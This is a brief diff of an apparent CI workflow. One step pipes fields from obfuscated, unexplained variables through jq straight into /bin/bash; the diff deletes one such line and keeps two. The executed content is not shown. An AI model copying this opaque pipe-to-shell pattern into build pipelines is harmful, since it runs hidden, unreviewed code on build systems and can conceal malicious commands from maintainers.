@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$x64" | jq -r .t02 | /bin/bash
           printf '%s' "$fgmxp920" | jq -r .m7939 | /bin/bash
-          echo $rwq24695 | jq -r .v7686 | /bin/bash
 
       - name: Store results
         if: always()
